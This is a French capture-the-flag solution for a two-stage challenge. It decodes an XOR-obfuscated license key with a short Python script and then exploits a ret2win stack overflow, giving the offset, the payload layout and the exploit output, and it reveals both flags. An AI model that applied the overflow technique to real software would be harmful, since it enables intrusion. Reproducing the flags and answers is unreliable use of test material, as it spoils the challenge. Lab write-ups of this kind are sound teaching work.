# Solution — VAULT-9 (Red Team 3) ⚠️ SPOILERS

Challenge intermédiaire en deux étapes : **reverse** puis **exploitation binaire (ret2win)**.

- **Flag 1** : `RM{r3v3rs3_l3_x0r_c0mm3_un_pr0}`
- **Flag 2** : `RM{r3t2w1n_l4_v4ult_3st_0uv3rt3}`

Le binaire est compilé **sans canari de pile et sans PIE** (`-fno-stack-protector -no-pie`), ce qui rend le ret2win réalisable au niveau intermédiaire.

```
$ checksec vault
    Arch:     amd64
    RELRO:    Partial
    Stack:    No canary found
    NX:       enabled
    PIE:      No PIE (0x400000)
```

## Étape 1 — Reverse de la licence

En désassemblant `check_license()` (Ghidra, IDA, ou `objdump -d`), on voit :
- la longueur attendue est **16** ;
- chaque octet saisi est **XORé avec `0x5C`** puis comparé à un tableau constant `LICENSE_ENC` en `.rodata`.

La licence est donc `LICENSE_ENC ^ 0x5C`. Récupération rapide :

```python
enc = [41, 50, 48, 108, 63, 55, 3, 40, 52, 111, 3, 42, 104, 41, 48, 40]
print(bytes(b ^ 0x5C for b in enc).decode())   # -> unl0ck_th3_v4ult
```

En saisissant `unl0ck_th3_v4ult`, le programme affiche le **flag 1** et donne accès au « terminal de maintenance ».

## Étape 2 — Débordement de tampon (ret2win)

`access_terminal()` lit **200 octets** via `read()` dans `buf[64]` → débordement.

Cartographie de la pile :

```
[ buf : 64 octets ]      <- rbp-0x40
[ rbp sauvegardé : 8 ]
[ adresse de retour : 8 ]   <- cible
```

Offset jusqu'à l'adresse de retour = **64 + 8 = 72**.

La fonction `vault()` (jamais appelée par le flux normal) affiche le flag 2. Il suffit de rediriger l'exécution vers elle. Un gadget `ret` est inséré avant l'adresse de `vault()` pour **réaligner la pile sur 16 octets** (sinon `movaps` dans `printf`/`puts` peut faire crasher).

```
payload = b"A"*72 + p64(ret_gadget) + p64(vault)
```

## Exploit automatisé

`exploit.py` (pwntools) enchaîne les deux étapes :

```bash
# récupérer le binaire distribué dans le dossier courant, puis :
python3 exploit.py <ip_instance> <port_instance>
```

Sortie attendue :

```
[+] vault() @ 0x401334
[+] Flag 1 : RM{r3v3rs3_l3_x0r_c0mm3_un_pr0}
[+] Flag 2 : RM{r3t2w1n_l4_v4ult_3st_0uv3rt3}
```

> Testé et validé le 20/07/2026 : chaîne complète fonctionnelle (offset 72, gadget `ret` pour l'alignement, ret2win vers `vault`).
